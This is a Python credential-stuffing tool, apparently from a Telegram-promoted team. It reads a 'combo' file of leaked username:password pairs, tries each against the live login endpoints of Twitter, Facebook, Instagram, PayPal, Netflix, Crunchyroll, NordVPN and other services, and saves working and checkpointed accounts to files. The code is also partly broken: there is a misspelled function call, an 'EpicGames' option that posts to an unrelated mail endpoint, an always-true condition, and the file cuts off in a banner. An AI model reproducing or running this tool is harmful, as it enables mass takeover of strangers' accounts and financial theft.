#The Programmer MrGps <--> Team TrackCobra
#Channel  Telegram : @MrGps0
#My Acc :Telegram : @MrGps1
#Github : MrGps1
#Please Dont't edit for my Copyrights'



import requests
from uuid import uuid4
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
from random import *
from os import system
from time import *
from sys import *

def Tiwtter():
    system('clear')
    def banner(s):
        for c in s + "\n":
            stdout.write(c)
            stdout.flush()
            sleep(10. / 5000)
    banner("""
\033[0;36m              0000                                                                          
\033[0;36m000000000000  0000                          0000        0000     \033[0;37m                           
\033[0;36m    0000                                    0000        0000     \033[0;37m                           
\033[0;36m    0000      0000  0000    0000    0000  0000000000  0000000000 \033[0;37m   0000000000    0000  0000
\033[0;36m    0000      0000  0000    0000    0000    0000        0000      \033[0;37m0000      0000  0000000000
\033[0;36m    0000      0000    0000  0000  0000      0000        0000      \033[0;37m0000      0000  0000      
\033[0;36m    0000      0000    0000  0000  0000      0000        0000      \033[0;37m00000000000000  0000      
\033[0;36m    0000      0000    000000    000000      0000        0000      \033[0;37m0000            0000      
\033[0;36m    0000      0000      0000    0000        0000        0000      \033[0;37m0000        00  0000      
\033[0;36m    0000      0000      0000    0000          000000      000000  \033[0;37m  0000000000    0000       
    """)
    choose = input(' \033[0;36m[\033[0;37m?\033[0;36m] \033[0;37mFile \033[0;36mCombo \033[0;37m/\033[0;36m ')
    print('')
    f = open(choose,'r')
    for i in open(choose,'r').read().split('\n'):
    	user = f.readline().split('\n')[0]
    	username = user.split(':')[0]
    	password = user.split(':')[1]
    	headers={
		'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
		'Accept-Encoding': 'gzip, deflate, br',
		'Accept-Language': 'ar,en-US;q=0.7,en;q=0.3',
		'Content-Length': '901',
		'Content-Type': 'application/x-www-form-urlencoded',
		'Cookie': 'personalization_id="v1_aFGvGiam7jnp1ks4ml5SUg=="; guest_id=v1%3A161776685629025416; gt=1379640315083112449; ct0=de4b75112a3f496676a1b2eb0c95ef65; _twitter_sess=BAh7CSIKZmxhc2hJQzonQWN0aW9uQ29udHJvbGxlcjo6Rmxhc2g6OkZsYXNo%250ASGFzaHsABjoKQHVzZWR7ADoPY3JlYXRlZF9hdGwrCIA8a6p4AToMY3NyZl9p%250AZCIlM2RlMDA1MzYyNmJiMGQwYzQ1OGU2MjFhODY5ZGU5N2Y6B2lkIiU4ODM0%250AMjM5OTNlYjg0ZGExNzRiYTEwMWE0M2ZhYTM0Mw%253D%253D--f5b0bce9df3870f1a221ae914e684fbdc533d03d; external_referer=padhuUp37zjgzgv1mFWxJ12Ozwit7owX|0|8e8t2xd8A2w%3D; _mb_tk=10908ac0975311eb868c135992f7d397',
		'Host': 'twitter.com',
		'Origin': 'https://twitter.com',
		'Referer': 'https://twitter.com/login?lang=ar',
		'TE': 'Trailers',
		'Upgrade-Insecure-Requests': '1',
		'User-Agent':'Mozilla/5.0 (X11; Ubuntu; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2708.48 Safari/537.36'
	        }
    	data={
		'redirect_after_login': '/',
		'remember_me': '1',
		'authenticity_token': '10908ac0975311eb868c135992f7d397',
		'wfa': '1',
		'ui_metrics': '{\"rf\":{\"ab4c9cdc2d5d097a5b2ccee53072aff6d2b5b13f71cef1a233ff378523d85df3\":1,\"a51091a0c1e2864360d289e822acd0aa011b3c4cabba8a9bb010341e5f31c2d2\":84,\"a8d0bb821f997487272cd2b3121307ff1e2e13576a153c3ba61aab86c3064650\":-1,\"aecae417e3f9939c1163cbe2bde001c0484c0aa326b8aa3d2143e3a5038a00f9\":84},\"s\":\"MwhiG0C4XblDIuWnq4rc5-Ua8dvIM0Z5pOdEjuEZhWsl90uNoC_UbskKKH7nds_Qdv8yCm9Np0hTMJEaLH8ngeOQc5G9TA0q__LH7_UyHq8ZpV2ZyoY7FLtB-1-Vcv6gKo40yLb4XslpzJwMsnkzFlB8YYFRhf6crKeuqMC-86h3xytWcTuX9Hvk7f5xBWleKfUBkUTzQTwfq4PFpzm2CCyVNWfs-dmsED7ofFV6fRZjsYoqYbvPn7XhWO1Ixf11Xn5njCWtMZOoOExZNkU-9CGJjW_ywDxzs6Q-VZdXGqqS7cjOzD5TdDhAbzCWScfhqXpFQKmWnxbdNEgQ871dhAAAAXiqazyE\"}',
		'session[username_or_email]': username,
		'session[password]': password
	        }
    	url = 'https://twitter.com/sessions'
    	req=requests.post(url,headers=headers,data=data)
    	
    	if ("ct0") in req.cookies:
    		print(f' \033[0;36mTrue \033[0;37m: \033[0;36m{username}:{password}')
    		file = open('Tiwtter.txt','a')
    		file.write(username+':'+password)
    	else:
    		print(f' \033[0;37mFalse \033[0;36m: \033[0;37m{username}:{password}')
    	


def Facebook():
    system('clear')
    def banner(s):
        for c in s + "\n":
            stdout.write(c)
            stdout.flush()
            sleep(10. / 5000)
    banner("""
                                                         \033[0;37m 0000                                            0000        
\033[0;36m000000000000                                             \033[0;37m 0000                                            0000        
\033[0;36m0000                                                     \033[0;37m 0000                                            0000        
\033[0;36m0000            00000000      00000000      0000000000   \033[0;37m 0000  000000      0000000000      0000000000    0000    0000
\033[0;36m0000          00      0000  0000      00  0000      0000  \033[0;37m000000    0000  0000      0000  0000      0000  0000  0000  
\033[0;36m0000000000            0000  0000          0000      0000  \033[0;37m0000      0000  0000      0000  0000      0000  00000000    
\033[0;36m0000          000000000000  0000          00000000000000 \033[0;37m 0000      0000  0000      0000  0000      0000  000000      
\033[0;36m0000        0000      0000  0000          0000           \033[0;37m 0000      0000  0000      0000  0000      0000  00000000    
\033[0;36m0000        0000      0000  0000      00  0000        00  \033[0;37m0000      0000  0000      0000  0000      0000  0000  0000  
\033[0;36m0000          000000000000    00000000      0000000000    \033[0;37m000000000000      0000000000      0000000000    0000    0000
""")
    choose = input(' \033[0;36m[\033[0;37m?\033[0;36m] \033[0;37mFile \033[0;36mCombo \033[0;37m/\033[0;36m ')
    print('')
    f = open(choose,'r')
    for i in open(choose,'r').read().split('\n'):
    	user = f.readline().split('\n')[0]
    	username = user.split(':')[0]
    	password = user.split(':')[1]
    	
    	url = 'https://mobile.facebook.com/login.php'
    	headers = {
'User-Agent' : 'Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2687.84 Safari/537.36',
'Accept-Language' : 'en-US,en;q=0.5'
}
    	data = {
    'email': username,
    'pass': password
    }
    	Face = requests.post(url, headers=headers, data=data).text
    	if "xc_message" in Face:
    		print(f' \033[0;36mTrue \033[0;37m: \033[0;36m{username}:{password}')
    		file = open('Facebook.txt','a')
    		file.write(username+':'+password)
    	elif "checkpointSubmitButton-actual-button" in Face:
    		print(f' \033[0;36mCp \033[0;37m: \033[0;36m{username}:{password}')
    		file = open('Facebook-Cp.txt','a')
    		file.write(username+':'+password)
    	else:
    		print(f' \033[0;37mFalse \033[0;36m: \033[0;37m{username}:{password}')
			

def Instagram():
    system('clear')
    def banner(s):
        for c in s + "\n":
            stdout.write(c)
            stdout.flush()
            sleep(10. / 5000)
    banner("""
\033[0;36m00000000                                  0000                                                                                      
\033[0;36m  0000                                    0000                     \033[0;37m                                                                 
\033[0;36m  0000    0000  000000      00000000    0000000000      00000000   \033[0;37m   000000000000  0000  0000      00000000    0000000000  000000  
\033[0;36m  0000    000000    0000  0000      00    0000        00      0000 \033[0;37m 0000      0000  0000000000    00      0000  0000    0000    0000
\033[0;36m  0000    0000      0000  000000          0000                0000 \033[0;37m 0000      0000  0000                  0000  0000    0000    0000
\033[0;36m  0000    0000      0000    00000000      0000        000000000000  \033[0;37m0000      0000  0000          000000000000  0000    0000    0000
\033[0;36m  0000    0000      0000        000000    0000      0000      0000  \033[0;37m0000      0000  0000        0000      0000  0000    0000    0000
\033[0;36m  0000    0000      0000  00      0000    0000      0000      0000  \033[0;37m0000    000000  0000        0000      0000  0000    0000    0000
\033[0;36m00000000  0000      0000    00000000        000000    000000000000   \033[0;37m 000000  0000  0000          000000000000  0000    0000    0000
\033[0;36m                                                                     \033[0;37m         0000                                                  
\033[0;36m                                                                   \033[0;37m 00        0000                                                  
\033[0;36m                                                                   \033[0;37m   0000000000                                                    
    """)
    
    choose = input(' \033[0;36m[\033[0;37m?\033[0;36m] \033[0;37mFile \033[0;36mCombo \033[0;37m/\033[0;36m ')
    print('')
    f = open(choose,'r')
    for i in open(choose,'r').read().split('\n'):
    	user = f.readline().split('\n')[0]
    	username = user.split(':')[0]
    	password = user.split(':')[1]
    	
    	r = requests.Session()
    	url = 'https://i.instagram.com/api/v1/accounts/login'
    	headers = {
		'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
		'Accept': "*/*",
		'Cookie': 'missing',
		'Accept-Encoding': 'gzip, deflate',
		'Accept-Language': 'en-US',
		'X-IG-Capabilities': '3brTvw==',
		'X-IG-Connection-Type': 'WIFI',
		'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
		'Host': 'i.instagram.com'}
    	uid = str(uuid4())
    	data = {        
		'uuid': uid,
		'password': password,
		'username': username,
		'device_id': uid,
		'from_reg': 'false',
		'_csrftoken': 'missing',
		'login_attempt_countn': '0'}
    	req_login = r.post(url,headers=headers,data=data,allow_redirects=True)
    	
    	if ("logged_in_user") in req_login.text:
    		print(f' \033[0;36mTrue \033[0;37m: \033[0;36m{username}:{password}')
    		file = open('Instagram.txt','a')
    		file.write(username+':'+password)
    	elif 'message' and "challenge_required" and "challenge" in req_login.text:
    		print(f' \033[0;36mCp \033[0;37m: \033[0;36m{username}:{password}')
    		file = open('Instagram-Cp.txt','a')
    		file.write(username+':'+password)
    	else:
    		print(f' \033[0;37mFalse \033[0;36m: \033[0;37m{username}:{password}')


def Paypal():
    system('clear')
    def banner(s):
        for c in s + "\n":
            stdout.write(c)
            stdout.flush()
            sleep(10. / 5000)
    banner("""
    \033[0;36m                                           \033[0;37m                                 0000
\033[0;36m000000000000                                   \033[0;37m                                 0000
\033[0;36m0000      0000                                 \033[0;37m                                 0000
\033[0;36m0000      0000      00000000    0000      0000 \033[0;37m 0000  000000        00000000    0000
\033[0;36m0000      0000    00      0000  0000      0000 \033[0;37m 000000    0000    00      0000  0000
\033[0;36m0000      0000            0000  0000      0000 \033[0;37m 0000      0000            0000  0000
\033[0;36m000000000000      000000000000    0000  0000   \033[0;37m 0000      0000    000000000000  0000
\033[0;36m0000            0000      0000    0000  0000   \033[0;37m 0000      0000  0000      0000  0000
\033[0;36m0000            0000      0000      000000     \033[0;37m 0000      0000  0000      0000  0000
\033[0;36m0000              000000000000      000000     \033[0;37m 000000000000      000000000000  0000
\033[0;36m                                      0000     \033[0;37m 0000                                
\033[0;36m                                    0000       \033[0;37m 0000                                
\033[0;36m                                    0000       \033[0;37m 0000                                
                                    """)
    choose = input(' \033[0;36m[\033[0;37m?\033[0;36m] \033[0;37mFile \033[0;36mCombo \033[0;37m/\033[0;36m ')
    print('')
    f = open(choose,'r')
    for i in open(choose,'r').read().split('\n'):
    	user = f.readline().split('\n')[0]
    	username = user.split(':')[0]
    	password = user.split(':')[1]
    	url = 'https://www.paypal.com/signin'
    	headers = {
'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:45.0) Gecko/20100101 Firefox/45.0',
'Accept': 'application/json',
'Accept-Encoding': 'gzip, deflate, br',
'Accept-Language': 'en-US,en;q=0.5',
'Connection': 'keep-alive',
'Content-type': 'application/x-www-form-urlencoded',
'Content-Length': '1089',
'Host': 'www.paypal.com',
'X-Requested-With': 'XMLHttpRequest'
}

    	data = {
'login_email': username,
'login_password': password
	}
    	r = requests.Session()

    	req = r.post(url,headers=headers,data=data)
		
    	if 'myaccount' in req.text:
    		print(f' \033[0;36mTrue \033[0;37m: \033[0;36m{username}:{password}')
    		file = open('Paypal.txt','a')
    		file.write(username+':'+password)
    	elif 'Too many requests' in req.text:
    		print(f' \033[0;36mCp \033[0;37m: \033[0;36m{username}:{password}')
    		file = open('Paypal-Cp.txt','a')
    		file.write(username+':'+password)
    	else:
    		print(f' \033[0;37mFalse \033[0;36m: \033[0;37m{username}:{password}')

def Noon():
    system('clear')
    def banner(s):
        for c in s + "\n":
            stdout.write(c)
            stdout.flush()
            sleep(10. / 5000)
    banner("""
\033[0;36m000000      00                 \033[0;37m                               
\033[0;36m000000      00                 \033[0;37m                               
\033[0;36m00  0000    00    0000000000   \033[0;37m   0000000000    0000  000000  
\033[0;36m00  0000    00  0000      0000 \033[0;37m 0000      0000  000000    0000
\033[0;36m00    0000  00  0000      0000 \033[0;37m 0000      0000  0000      0000
\033[0;36m00    0000  00  0000      0000 \033[0;37m 0000      0000  0000      0000
\033[0;36m00      000000  0000      0000 \033[0;37m 0000      0000  0000      0000
\033[0;36m00      000000  0000      0000 \033[0;37m 0000      0000  0000      0000
\033[0;36m00        0000    0000000000    \033[0;37m  0000000000    0000      0000

    """)
    
    choose = input(' \033[0;36m[\033[0;37m?\033[0;36m] \033[0;37mFile \033[0;36mCombo \033[0;37m/\033[0;36m ')
    print('')
    f = open(choose,'r')
    for i in open(choose,'r').read().split('\n'):
    	user = f.readline().split('\n')[0]
    	username = user.split(':')[0]
    	password = user.split(':')[1]
    	head = {
			'Host': 'api-app.noon.com',
			'Cookie': 'missing',
			'Content-Type': 'application/json',
			'X-Experience': 'ecom',
			'X-Locale': 'ar-sa',
			'Accept': 'application/json, text/plain, */*',
			'X-Mp': 'noon',
			'Accept-Language': 'en-us',
			'Cache-Control': 'no-cache',
			'X-Content': 'mobile',
			'Content-Length': '52',
			'User-Agent': 'noon/1000 CFNetwork/1237 Darwin/20.4.0',
			'X-Device-Id': '9149EBD3-33DE-4568-918B-0469ECAA6453',
			'X-Platform': 'ios',
			'X-Build': '1000',
			'Connection': 'close'}
    	data = {"email": username, "password": password}
    	req1 = requests.post("https://api-app.noon.com/_svc/customer-v1/auth/signin", headers=head, json=data, timeout=4)
    	if req1.status_code == 200:
    		print(f' \033[0;36mTrue \033[0;37m: \033[0;36m{username}:{password}')
    		file = open('Noon.txt','a')
    		file.write(username+':'+password)
    	else:
    		print(f' \033[0;37mFalse \033[0;36m: \033[0;37m{username}:{password}')


def CrunchyRoll():
    system('clear')
    def banner(s):
        for c in s + "\n":
            stdout.write(c)
            stdout.flush()
            sleep(10. / 5000)
    banner("""
\033[0;36m                                                                          0000                           \033[0;37m                                   0000  0000
\033[0;36m  0000000000                                                              0000                           \033[0;37m 000000000000                      0000  0000
\033[0;36m0000        00                                                            0000                           \033[0;37m 0000      0000                    0000  0000
\033[0;36m0000        00  0000  0000  0000      0000  0000  000000      00000000    0000  000000    0000      0000 \033[0;37m 0000      0000      0000000000    0000  0000
\033[0;36m0000            0000000000  0000      0000  000000    0000  0000      00  000000    0000  0000      0000 \033[0;37m 0000      0000    0000      0000  0000  0000
\033[0;36m0000            0000        0000      0000  0000      0000  0000          0000      0000  0000      0000 \033[0;37m 000000000000      0000      0000  0000  0000
\033[0;36m0000            0000        0000      0000  0000      0000  0000          0000      0000    0000  0000   \033[0;37m 0000  0000        0000      0000  0000  0000
\033[0;36m0000        00  0000        0000      0000  0000      0000  0000          0000      0000    0000  0000   \033[0;37m 0000    0000      0000      0000  0000  0000
\033[0;36m0000        00  0000        0000    000000  0000      0000  0000      00  0000      0000      000000     \033[0;37m 0000      0000    0000      0000  0000  0000
\033[0;36m  0000000000    0000          000000  0000  0000      0000    00000000    0000      0000      000000     \033[0;37m 0000        0000    0000000000    0000  0000
    """)
    choose = input(' \033[0;36m[\033[0;37m?\033[0;36m] \033[0;37mFile \033[0;36mCombo \033[0;37m/\033[0;36m ')
    print('')
    f = open(choose,'r')
    for i in open(choose,'r').read().split('\n'):
    	user = f.readline().split('\n')[0]
    	username = user.split(':')[0]
    	password = user.split(':')[1]
    	head = {
				'Host': 'beta-api.crunchyroll.com',
				'Content-Type': 'application/x-www-form-urlencoded; charset=utf-8',
				'Content-Length': '72',
				'Accept': '*/*',
				'Cookie': '__cf_bm=e5139fd59755316a1d33207946e491eedca399d4-1622012072-1800-AXtJ1LgqzVNJZK3q5xqlwl/WszKCJLs42G5q/2Eol1mjpzqNk1vMvaNLTGLhSdox4RZOxCMM3j6m+7AgqcL21rJzugUjmo3ZHo+xht26QxhF',
				'Connection': 'keep-alive',
				'ETP-Anonymous-ID': '4CDCA8EE-660B-4820-86AC-65CC26A2834B',
				'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2735.10 Safari/537.36',
				'Accept-Language': 'ar-SA;q=1.0',
				'Authorization': 'Basic M2V2eDJudnF1ZTB1eG5wemJ2aG86NGZMUWRmQmVJdk1yNlVPei1Fb1N3aXZ0cmZ6Ym9HOFU=',
				'Accept-Encoding': 'gzip;q=1.0, compress;q=0.5'}
    	data = {
				'grant_type': 'password',
				'password': password,
				'scope': 'offline_access',
				'username': username}
    	req = requests.post('https://beta-api.crunchyroll.com/auth/v1/token', headers=head, data=data)
    	if 'refresh_token' in req.text:
    		print(f' \033[0;36mTrue \033[0;37m: \033[0;36m{username}:{password}')
    		file = open('CrunchyRoll.txt','a')
    		file.write(username+':'+password)
    	elif 'force_password_reset' in req.text:
    		print(f' \033[0;37mFalse \033[0;36m: \033[0;37m{username}:{password}')
    	elif 'invalid_credentials' in req.text:
    		print(f' \033[0;37mFalse \033[0;36m: \033[0;37m{username}:{password}')
    	elif 'too_many_requests' in req.text:
    		print(f' \033[0;37mFalse \033[0;36m: \033[0;37m{username}:{password}')
    	elif '406 Not Acceptable' in req.text:
    		print(f' \033[0;37mFalse \033[0;36m: \033[0;37m{username}:{password}')
    	elif 'Attention Required!' in req.text:
    		print(f' \033[0;36mCp \033[0;37m: \033[0;36m{username}:{password}')
    		file = open('CrunchyRoll-Cp.txt','a')
    		file.write(username+':'+password)
    	else:
    		print(f' \033[0;37mFalse \033[0;36m: \033[0;37m{username}:{password}')


def Namshi():
    system('clear')
    def banner(s):
        for c in s + "\n":
            stdout.write(c)
            stdout.flush()
            sleep(10. / 5000)
    banner("""
\033[0;36m                                                     \033[0;37m               0000            0000
\033[0;36m000000      00                                       \033[0;37m               0000            0000
\033[0;36m000000      00                                       \033[0;37m               0000                
\033[0;36m00  0000    00      00000000    0000000000  000000   \033[0;37m   00000000    0000  000000    0000
\033[0;36m00  0000    00    00      0000  0000    0000    0000 \033[0;37m 0000      00  000000    0000  0000
\033[0;36m00    0000  00            0000  0000    0000    0000 \033[0;37m 000000        0000      0000  0000
\033[0;36m00    0000  00    000000000000  0000    0000    0000 \033[0;37m   00000000    0000      0000  0000
\033[0;36m00      000000  0000      0000  0000    0000    0000 \033[0;37m       000000  0000      0000  0000
\033[0;36m00      000000  0000      0000  0000    0000    0000 \033[0;37m 00      0000  0000      0000  0000
\033[0;36m00        0000    000000000000  0000    0000    0000 \033[0;37m   00000000    0000      0000  0000
    """)
    
    choose = input(' \033[0;36m[\033[0;37m?\033[0;36m] \033[0;37mFile \033[0;36mCombo \033[0;37m/\033[0;36m ')
    print('')
    f = open(choose,'r')
    for i in open(choose,'r').read().split('\n'):
    	user = f.readline().split('\n')[0]
    	username = user.split(':')[0]
    	password = user.split(':')[1]
    	
    	url = 'https://login.namshi.com/_svc/jerry/v2/login'
    	data = {"email": username, "password": password}
    	headers = {
				'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2735.10 Safari/537.36'}
    	net = requests.post(url, headers=headers, data=data)
    	if "كلمة السر / البريد الالكتروني الذي تم إدخاله غير صحيح" in net:
    		print(f' \033[0;37mFalse \033[0;36m: \033[0;37m{username}:{password}')
    	elif "email" in net:
    		print(f' \033[0;36mTrue \033[0;37m: \033[0;36m{username}:{password}')
    		file = open('Namshi.txt','a')
    		file.write(username+':'+password)
    	else:
    		print(f' \033[0;37mFalse \033[0;36m: \033[0;37m{username}:{password}')


def EpicGames():
    system('clear')
    def banner(s):
        for c in s + "\n":
            stdout.write(c)
            stdout.flush()
            sleep(10. / 5000)
    banner("""
\033[0;36m                              0000               \033[0;37m                                                                                   
\033[0;36m000000000000                  0000               \033[0;37m   0000000000                                                                      
\033[0;36m0000                                             \033[0;37m 0000        00                                                                    
\033[0;36m0000          0000  000000    0000    00000000   \033[0;37m 0000        00      00000000    0000000000  000000      0000000000      00000000  
\033[0;36m0000          000000    0000  0000  0000      00 \033[0;37m 0000              00      0000  0000    0000    0000  0000      0000  0000      00
\033[0;36m0000000000    0000      0000  0000  0000         \033[0;37m 0000    000000            0000  0000    0000    0000  0000      0000  000000      
\033[0;36m0000          0000      0000  0000  0000         \033[0;37m 0000      0000    000000000000  0000    0000    0000  00000000000000    00000000  
\033[0;36m0000          0000      0000  0000  0000         \033[0;37m 0000      0000  0000      0000  0000    0000    0000  0000                  000000
\033[0;36m0000          0000      0000  0000  0000      00 \033[0;37m 0000      0000  0000      0000  0000    0000    0000  0000        00  00      0000
\033[0;36m000000000000  000000000000    0000    00000000   \033[0;37m   000000000000    000000000000  0000    0000    0000    0000000000      00000000  
\033[0;36m              0000                                                                                                                  
\033[0;36m              0000                                                                                                                  
\033[0;36m              0000                                                                                                                  
    """)
    
    choose = input(' \033[0;36m[\033[0;37m?\033[0;36m] \033[0;37mFile \033[0;36mCombo \033[0;37m/\033[0;36m ')
    print('')
    f = open(choose,'r')
    for i in open(choose,'r').read().split('\n'):
    	user = f.readline().split('\n')[0]
    	username = user.split(':')[0]
    	password = user.split(':')[1]
    	url = 'https://aj-https.my.com/cgi-bin/auth?Lang=en_US&mp=android&mmp=mail&DeviceID=&client=mobile&udid=&instanceid=cEHwYCtZfcM&playservices=212116037&connectid=&os=Android&os_version=10&ver=com.my.mail13.13.1.33372&appbuild=33372&vendor=Xiaomi&model=Redmi%20Note%209S&device_type=tablet&country=US&language=en_US&timezone=GMT%2B02%3A00&device_name=Xiaomi%20Redmi%20Note%209S&DeviceInfo=%7B%22OS%22%3A%22Android%22%2C%22AppVersion%22%3A%22com.my.mail13.13.1.33372%22%2C%22AppBuild%22%3A%2233372%22%2C%22Device%22%3A%22Redmi%20Note%209S%22%2C%22Timezone%22%3A%22GMT%2B02%3A00%22%2C%22DeviceName%22%3A%22Xiaomi%20Redmi%20Note%209S%22%2C%22Useragent%22%3A%22Mozilla%5C%2F5.0%20(Linux%3B%20Android%2010%3B%20Redmi%20Note%209S%20Build%5C%2FQKQ1.191215.002%3B%20wv)%20AppleWebKit%5C%2F537.36%20(KHTML%2C%20like%20Gecko)%20Version%5C%2F4.0%20Chrome%5C%2F91.0.4472.120%20Mobile%20Safari%5C%2F537.36%22%2C%22playservices%22%3A%22212116037%22%2C%22connectid%22%3A%224a93e679058284a39a7d6da21038cf5b%22%7D&idfa=<idfa>&appsflyerid=&current=google&first=google&md5_signature=<ms>'
    	data = {'Password': password, 'oauth2': '0', 'Login': username, 'mobile': '1', 'mob_json': '1', 'simple': '1',
					'useragent': 'android', 'md5_post_signature': 'defbd7686b82ef1f17d3a1145aac0263'}
    	headers = {
				'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2735.10 Safari/537.36'}
    	net = requests.post(url, headers=headers, data=data, verify=False)
    	if '"Ok=1"' in net.text:
    		print(f' \033[0;36mTrue \033[0;37m: \033[0;36m{username}:{password}')
    		file = open('EpicGames.txt','a')
    		file.write(username+':'+password)
    	elif '"Ok=0"' in net.text:
    		print(f' \033[0;37mFalse \033[0;36m: \033[0;37m{username}:{password}')



def Netflix():
    system('clear')
    def banner(s):
        for c in s + "\n":
            stdout.write(c)
            stdout.flush()
            sleep(10. / 5000)
    baner("""
\033[0;36m                                           \033[0;36m     0000000000  0000              
\033[0;36m000000      00                    0000     \033[0;36m   0000    0000  0000              
\033[0;36m000000      00                    0000     \033[0;36m   0000    0000                    
\033[0;36m00  0000    00    0000000000    0000000000 \033[0;36m 00000000  0000  0000  0000    0000
\033[0;36m00  0000    00  0000      0000    0000     \033[0;36m   0000    0000  0000  0000    0000
\033[0;36m00    0000  00  0000      0000    0000     \033[0;36m   0000    0000  0000    00000000  
\033[0;36m00    0000  00  00000000000000    0000     \033[0;36m   0000    0000  0000      0000    
\033[0;36m00      000000  0000              0000     \033[0;36m   0000    0000  0000    00000000  
\033[0;36m00      000000  0000        00    0000     \033[0;36m   0000    0000  0000  0000    0000
\033[0;36m00        0000    0000000000        000000 \033[0;36m   0000    0000  0000  0000    0000
    """)
    choose = input(' \033[0;36m[\033[0;37m?\033[0;36m] \033[0;37mFile \033[0;36mCombo \033[0;37m/\033[0;36m ')
    print('')
    f = open(choose,'r')
    for i in open(choose,'r').read().split('\n'):
    	user = f.readline().split('\n')[0]
    	username = user.split(':')[0]
    	password = user.split(':')[1]
    	url = 'https://api-global.netflix.com/account/auth'
    	data = {'email': username, 'password': password, 'setCookies': 'true'}
    	headers = {
				'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2735.10 Safari/537.36'}
    	net = requests.post(url, headers=headers, data=data, verify=False)
    	if '"NetflixId":null,"user":{"' in net.text or 'Incorrect email address or password' in net.text or 'Missing password' in net.text or 'NEVER_MEMBER' in net.text:
    		print(f' \033[0;37mFalse \033[0;36m: \033[0;37m{username}:{password}')
    	elif 'Invalid Request' in net.text:
    		print(f' \033[0;37mFalse \033[0;36m: \033[0;37m{username}:{password}')
    	elif 'CURRENT_MEMBER' in net.text:
    		print(f' \033[0;36mTrue \033[0;37m: \033[0;36m{username}:{password}')
    		file = open('Netflix.txt','a')
    		file.write(username+':'+password)
    	elif 'FORMER_MEMBER' in net.text:
    		print(f' \033[0;36mCp \033[0;37m: \033[0;36m{username}:{password}')
    		file = open('Netflix-Cp.txt','a')
    		file.write(username+':'+password)
    	else:
    		print(f' \033[0;37mFalse \033[0;36m: \033[0;37m{username}:{password}')
    		
				
				
def NordVpn():
    system('clear')
    def banner(s):
        for c in s +"\n":
            stdout.write(c)
            stdout.flush()
            sleep(10./5000)
    banner("""                     
\033[0;36m                                                      0000 \033[0;37m                                                 
\033[0;36m000000      00                                        0000 \033[0;37m 0000        0000                                
\033[0;36m000000      00                                        0000 \033[0;37m 0000        0000                                
\033[0;36m00  0000    00    0000000000    0000  0000    000000000000 \033[0;37m 0000        0000  0000  000000    0000  000000  
\033[0;36m00  0000    00  0000      0000  0000000000  0000      0000 \033[0;37m   0000    0000    000000    0000  000000    0000
\033[0;36m00    0000  00  0000      0000  0000        0000      0000  \033[0;37m  0000    0000    0000      0000  0000      0000
\033[0;36m00    0000  00  0000      0000  0000        0000      0000  \033[0;37m    00000000      0000      0000  0000      0000
\033[0;36m00      000000  0000      0000  0000        0000      0000  \033[0;37m    00000000      0000      0000  0000      0000
\033[0;36m00      000000  0000      0000  0000        0000    000000  \033[0;37m      0000        0000      0000  0000      0000
\033[0;36m00        0000    0000000000    0000          000000  0000  \033[0;37m      0000        000000000000    0000      0000
                                                                      \033[0;37m                                  
                                                                      \033[0;37m                                
                                                                      \033[0;37m                      
    """)
    choose = input(' \033[0;36m[\033[0;37m?\033[0;36m] \033[0;37mFile \033[0;36mCombo \033[0;37m/\033[0;36m ')
    print('')
    f = open(choose,'r')
    for i in open(choose,'r').read().split('\n'):
    	user = f.readline().split('\n')[0]
    	username = user.split(':')[0]
    	password = user.split(':')[1]
    	url = 'https://zwyr157wwiu6eior.com/v1/users/tokens'
    	data = {'username': username, 'password': password}
    	headers = {
				'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2735.10 Safari/537.36'}
    	net = requests.post(url, headers=headers, data=data)
    	if '"Invalid username"' or '"invalid password"' or 'Unauthorized' in net.text or net.status_code == 401:
    		print(f' \033[0;37mFalse \033[0;36m: \033[0;37m{username}:{password}')
    	elif 'user_id' in net.text or net.status_code == 201:
    		print(f' \033[0;36mTrue \033[0;37m: \033[0;36m{username}:{password}')
    		file = open('NordVpn.txt','a')
    		file.write(username+':'+password)
    	else:
    		print(f' \033[0;37mFalse \033[0;36m: \033[0;37m{username}:{password}')
			

#Start Script *

def Start():
	system('clear')
	def banner(s):
	 	for c in s +"\n":
 	          stdout.write(c)
 	          stdout.flush()
 	          sleep(10./5000)
	banner('''
    \033[0;36m                                                    0000         \033[0;37m                                 0000                                                
              \033[0;36m                                          0000         \033[0;37m                                 0000                                      
\033[0;36m000000000000                                            0000         \033[0;37m   0000000000                    0000                                      
\033[0;36m    0000                                                0000         \033[0;37m 0000        00                  0000                                      
\033[0;36m    0000      0000  0000      00000000      00000000    0000    0000  \033[0;37m0000        00    0000000000    0000  000000    0000  0000      00000000  
\033[0;36m    0000      0000000000    00      0000  0000      00  0000  0000    \033[0;37m0000            0000      0000  000000    0000  0000000000    00      0000
\033[0;36m    0000      0000                  0000  0000          00000000      \033[0;37m0000            0000      0000  0000      0000  0000                  0000
\033[0;36m    0000      0000          000000000000  0000          000000        \033[0;37m0000            0000      0000  0000      0000  0000          000000000000
\033[0;36m    0000      0000        0000      0000  0000          00000000      \033[0;37m0000        00  0000      0000  0000      0000  0000        0000      0000
\033[0;36m    0000      0000        0000      0000  0000      00  0000  0000    \033[0;37m0000        00  0000      0000  0000      0000  0000        0000      0000
\033[0;36m    0000      0000          000000000000    00000000    0000    0000  \033[0;37m  0000000000      0000000000    000000000000    0000          000000000000


